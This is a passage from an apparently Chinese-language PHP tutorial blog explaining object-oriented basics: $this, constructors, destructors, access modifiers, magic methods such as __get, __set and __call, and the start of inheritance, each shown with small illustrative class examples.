class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;我叫&#x27;</span>.<span class="variable language_">$this</span>-&gt;name; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$stu1</span> = <span class="keyword">new</span> <span class="title class_">Student</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$stu1</span> -&gt; name = <span class="string">&#x27;王建双&#x27;</span>; </span><br><span class="line"><span class="variable">$stu1</span> -&gt; <span class="title function_ invoke__">say</span>(); <span class="comment">// 我叫王建双</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1 $this代表当前这个对象,谁调用当前这个方法,那么$this就代表(等于)哪个对象</span></span><br><span class="line"><span class="comment">2.$this只能在类的内部使用  并且只能放置在成员方法中</span></span><br><span class="line"><span class="comment">3.$this不仅能访问成员属性 还能在成员方法中调用成员方法</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h4><p>创建对象时, 自动触发构造方法, 可以在构造方法中快速给对象属性赋值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span> -&gt; name = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; sex = <span class="variable">$b</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; age = <span class="variable">$c</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在实例化对象时,直接赋值     为了初始化对象</span></span><br><span class="line"><span class="variable">$stu1</span> = <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&#x27;王建双&#x27;</span>, <span class="string">&#x27;男&#x27;</span>, <span class="number">30</span>);</span><br></pre></td></tr></table></figure><h4 id="析构方法"><a href="#析构方法" class="headerlink" title="析构方法"></a>析构方法</h4><p>对象被销毁时, 自动触发该方法. </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="comment">// 资源释放, 断开连接, 关闭打开的资源 </span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>对象是变量, 所以当变量被赋值时, 原来的对象被覆盖销毁. </p></li><li><p>php代码结束时, 所有变量常量统统销毁, 对象是变量, 也被销毁.</p></li><li><p>使用unset销毁当前这个对象.</p></li></ol><h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1><p>使用修饰符修饰成员属性和成员方法,最大限度的隐藏对象的内部细节,保证对象的完整性和安全性</p><h2 id="成员修饰符"><a href="#成员修饰符" class="headerlink" title="成员修饰符"></a>成员修饰符</h2><h3 id="public-公有的"><a href="#public-公有的" class="headerlink" title="public  公有的"></a>public  公有的</h3><p>类的成员属性和成员方法, 可以在类的 <strong>外部</strong> 读取和调用.</p><p>如果成员方法前没有任何修饰符, 则默认为 public</p><p>对象把变量和函数用大括号装在一起</p><p>即 对象 &#x3D; {成员属性+成员方法} &#x3D; {变量 + 函数}</p><p>强调的是一个整体性.</p><p><strong>对象内部, 成员方法可以直接访问成员属性. 因此,方法之间传递数据非常方便.</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setName</span>(<span class="params"><span class="variable">$str</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">        <span class="comment">// 直接给成员属性赋值 </span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$str</span>; </span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">        <span class="comment">// 直接访问成员属性 </span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="private-私有的"><a href="#private-私有的" class="headerlink" title="private   私有的"></a>private   私有的</h3><p>类的成员属性和成员方法, 只能在类的 <strong>内部</strong> 读取和调用.</p><p><strong>对象中的有些成员属性和方法, 不应该直接被外部访问( 把 public 换成 private ).</strong></p><ol><li>想要知道女生的名字, 不能直接拿人家身份证, 需要向她请求询问.</li></ol><p>​女生回答(对象的成员方法), 其结果(返回值), 可以是真实姓名, 可以是假名字, 也可以拒绝告诉.</p><ol start="2"><li>借给朋友钱, 不应该把银行卡和密码给对方, 让对方自已去取.</li></ol><p>​而是应该隐藏细节, 只是把最终的钱借给他.</p><ol start="3"><li>对象成员属性有合理的取值范围, 比如年龄. 如果外部直接赋值, 可能是1000岁 这样不合理的值.</li></ol><p>​由对象自己提供专门的成员方法来设置,获取年龄.方法中进行必要的范围检查. 从而保证合理性. </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 问女孩名称 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Girl</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line"><span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;翠花&#x27;</span>; <span class="comment">// 改用 private , 禁止外部直接访问</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 由对象自身方法返回结果. </span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"> <span class="variable">$str</span> </span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$str</span>==<span class="string">&#x27;警察&#x27;</span>) &#123; </span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$str</span>==<span class="string">&#x27;油腻大叔&#x27;</span>) &#123; </span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;小仙女&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 借钱给朋友 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line"><span class="keyword">private</span> <span class="variable">$card</span>; <span class="comment">// 银行卡 </span></span><br><span class="line"><span class="keyword">private</span> <span class="variable">$password</span>; <span class="comment">// 密码 </span></span><br><span class="line"><span class="keyword">private</span> <span class="variable">$money</span>; <span class="comment">// 身上的现金 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 取钱 </span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">qu_qian</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="variable language_">$this</span>-&gt; money = 银行-&gt;<span class="title function_ invoke__">atm</span>(<span class="variable">$this</span>-&gt;card, <span class="variable">$thid</span>-&gt;password); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 借给别人钱 </span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">gei</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">qu_qian</span>(); <span class="comment">// 取钱是对象自己完成的, 不需要别人知道, 所以也是私有. </span></span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;money; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有些成员只是被其它成员访问使用, 不需要被外部知道, 那就加上 private .</p><p>在使用一个类对象时, 我们只需要关心它的public的, 可以被外部访问的成员. </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setAge</span>(<span class="params"><span class="variable">$n</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$n</span>&gt;=<span class="number">0</span> &amp;&amp; <span class="variable">$n</span>&lt;<span class="number">120</span>) &#123; </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;age = <span class="variable">$n</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;设置年龄不在合理范围内!&#x27;</span>; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAge</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;age; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="protected-受保护的"><a href="#protected-受保护的" class="headerlink" title="protected 受保护的"></a>protected 受保护的</h3><p>​受保护的成员属性在类的外部    不能直接访问</p><p>​受保护的成员方法在类的外部    不能直接调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$sex</span>; </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setAge</span>(<span class="params"><span class="variable">$n</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$n</span>&gt;=<span class="number">0</span> &amp;&amp; <span class="variable">$n</span>&lt;<span class="number">120</span>) &#123; </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;age = <span class="variable">$n</span>; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;设置年龄不在合理范围内!&#x27;</span>; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getAge</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;age; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><h3 id="get-和set"><a href="#get-和set" class="headerlink" title="get()和set()"></a>get()和set()</h3><p><strong>__get</strong> 获取对象中的<strong>非公有或不存在</strong>的成员属性时, 触发该方法   接受一个参数  属性名</p><p><strong>__set</strong> 设置对象中的<strong>非公有或不存在</strong>的成员属性时, 触发该方法   接受两个参数 (属性名,属性值)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line"><span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;景水&#x27;</span>; </span><br><span class="line"><span class="keyword">private</span> <span class="variable">$sex</span> = <span class="string">&#x27;男&#x27;</span>; </span><br><span class="line"><span class="keyword">private</span> <span class="variable">$age</span> = <span class="number">18</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// $prop 为要获取的属性名称 </span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$prop</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$prop</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $prop 为要设置的属性名称, $value 为要设置的具体值 </span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$prop</span>, <span class="variable">$value</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="variable">$prop</span> = <span class="variable">$value</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Test</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;name; <span class="comment">// 触发 __get() </span></span><br><span class="line"><span class="variable">$obj</span>-&gt;sex = <span class="string">&#x27;女&#x27;</span>; <span class="comment">// 触发 __set() </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">这两个方法代替了多个 getXXX 和 setXXX 方法 </span></span><br><span class="line"><span class="comment">从使用类的角度, 不需要知道 getXXX 和 setXXX 方法, </span></span><br><span class="line"><span class="comment">只是把成员属性当做public来使用即可, __get 和 __set 会自然的,</span></span><br><span class="line"><span class="comment">透明的起到 保护对象的目的. </span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="call"><a href="#call" class="headerlink" title="call()"></a>call()</h3><p><strong>__call()</strong> 调用对象中<strong>非公有或不存在</strong>的成员方法时, 触发该方法      接受两个参数 (函数名,参数列表)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 私有方法,不能在外部直接调用 </span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span> + <span class="variable">$b</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// $method 为要调用的方法名, $params 为调用方法时的参数数组 </span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$params</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$method</span>(...<span class="variable">$params</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Test</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span> -&gt; <span class="title function_ invoke__">add</span>(<span class="number">3</span>, <span class="number">4</span>); <span class="comment">// 触发 __call() 返回 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">有一种场景,可以利用__call在 原方法执行前,执行后添加代码.</span></span><br><span class="line"><span class="comment">如: </span></span><br><span class="line"><span class="comment">public function __call($method, $params) </span></span><br><span class="line"><span class="comment">&#123; </span></span><br><span class="line"><span class="comment">// 前置代码 $this-&gt;$method(...$params); // 后置代码 </span></span><br><span class="line"><span class="comment">&#125; </span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="isset-和unset"><a href="#isset-和unset" class="headerlink" title="isset()和unset()"></a>isset()和unset()</h3><p><strong>__isset</strong> 判断对象的<strong>非公有或不存在</strong>的属性时, 触发该方法        接受一个参数  属性名</p><p><strong>__unset</strong> 销毁对象的<strong>非公有或不存在</strong>的属性时, 触发该方法      接受一个参数  属性名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;景水&#x27;</span>; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span> = <span class="string">&#x27;男&#x27;</span>; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span> = <span class="number">18</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回真实的结果 $prop 要判断的属性名 </span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$prop</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;<span class="variable">$prop</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现销毁私有属性 $prop 要销毁的属性 </span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$prop</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;<span class="variable">$prop</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Test</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$obj</span>-&gt;name); <span class="comment">// 触发 __isset() </span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$obj</span>-&gt;sex);  <span class="comment">// 触发 __unset()</span></span><br></pre></td></tr></table></figure><h3 id="clone"><a href="#clone" class="headerlink" title="clone()"></a>clone()</h3><p><strong>__clone</strong> 当对象被克隆时,触发该方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;wangjs&#x27;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">    <span class="variable language_">$this</span> -&gt; name = <span class="string">&#x27;上神&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj1</span> = <span class="keyword">new</span> <span class="title class_">Test</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$obj2</span> = <span class="keyword">clone</span> <span class="variable">$obj1</span>; <span class="comment">// 触发 __clone</span></span><br></pre></td></tr></table></figure><h3 id="invoke"><a href="#invoke" class="headerlink" title="invoke()"></a>invoke()</h3><p><strong>__invoke</strong> 当对象被当做函数调用时, 触发该方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;你把我当成函数调用啦!&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Test</span>; </span><br><span class="line"><span class="variable">$obj</span>(); <span class="comment">// 触发 __invoke(), 可以用参数</span></span><br></pre></td></tr></table></figure><h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><p>就是别人有 但是我没有  这个时候需要使用继承 把它所有的东西都拿过来 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//基本格式</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;王建双&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;水清则无鱼&#x27;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// B类具有A类所有的成员. B类为子类, A类为父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span>  </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 这里面什么都不写, 也已经有A中的成员属性和成员方法</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 添加 成员属性 和 成员方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span> = <span class="string">&#x27;男&#x27;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">listen</span>(<span class="params"></span>)</span></span><br><span class="line"><span 